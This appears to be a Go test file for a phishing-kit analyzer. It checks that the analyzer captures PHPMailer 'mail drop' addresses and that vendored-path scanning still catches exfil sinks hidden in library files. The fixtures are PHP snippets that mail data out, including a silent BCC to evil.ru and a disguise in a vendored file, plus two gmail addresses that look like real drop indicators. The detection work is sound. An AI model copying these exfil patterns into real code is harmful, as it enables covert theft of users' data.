package main

import "testing"

func mapKeys(m map[string]struct{}) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// PHPMailer / SMTP exfil must be captured as mail drops — recipient
// (addAddress) and the attacker's sending account (setFrom / Username),
// resolved through same-file variable assignments.
func TestMailDrops_PHPMailer(t *testing.T) {
	src := `<?php
$to   = 'cooling.jamesofficial@gmail.com';
$from = 'weshannah354@gmail.com';
$m = new PHPMailer(true);
$m->Username = $from;
$m->setFrom($from, 'System Notifier');
$m->addAddress($to);
$m->addBCC("silent@evil.ru");
$m->send();`
	drops := map[string]struct{}{}
	scanMailDropsInto([]byte(src), drops)
	for _, want := range []string{
		"cooling.jamesofficial@gmail.com", // addAddress($to)
		"weshannah354@gmail.com",          // setFrom/Username ($from)
		"silent@evil.ru",                  // addBCC literal
	} {
		if _, ok := drops[want]; !ok {
			t.Errorf("expected mail drop %q, got %v", want, mapKeys(drops))
		}
	}
}

// Bare-string indicator scans (emails, authors, brands) must skip vendored
// library files, but sink-based scans (mail drops) must still run on them so a
// disguised exfil channel hidden in a library file is caught.
func TestScanNamed_VendoredHandling(t *testing.T) {
	// 1. Vendored library file: translator emails are NOT collected.
	libEmail := `<?php $PHPMAILER_LANG['x']='y'; // Translator: Foo <translator@chumakov.ru>`
	a := newAnalyzer(nil)
	a.scanNamed("K/PHPMailer/language/phpmailer.lang-ru.php", []byte(libEmail))
	if len(a.emails) != 0 {
		t.Errorf("vendored emails should be skipped, got %v", mapKeys(a.emails))
	}

	// 2. The kit's own file: emails ARE collected.
	a2 := newAnalyzer(nil)
	a2.scanNamed("K/comps.php", []byte(`<?php $x = "real@attacker.ru";`))
	if _, ok := a2.emails["real@attacker.ru"]; !ok {
		t.Errorf("kit-file email should be collected, got %v", mapKeys(a2.emails))
	}

	// 3. Disguise case: a mail-exfil sink hidden in a vendored file IS caught.
	a3 := newAnalyzer(nil)
	a3.scanNamed("K/PHPMailer/language/sneaky.php", []byte(`<?php $m->addAddress("hidden@evil.ru");`))
	if _, ok := a3.mailDrops["hidden@evil.ru"]; !ok {
		t.Errorf("disguised exfil in a vendored file should still be caught, got %v", mapKeys(a3.mailDrops))
	}
	if len(a3.emails) != 0 {
		t.Errorf("but its bare-string emails should still be skipped, got %v", mapKeys(a3.emails))
	}
}

func TestIsVendoredPath(t *testing.T) {
	vendored := []string{
		"K/PHPMailer/PHPMailer/src/PHPMailer.php",
		"kit/vendor/autoload.php",
		"x/node_modules/foo/bar.js",
	}
	own := []string{"K/comps.php", "mf.php", "admin/login.php"}
	for _, p := range vendored {
		if !isVendoredPath(p) {
			t.Errorf("%q should be vendored", p)
		}
	}
	for _, p := range own {
		if isVendoredPath(p) {
			t.Errorf("%q should NOT be vendored", p)
		}
	}
}
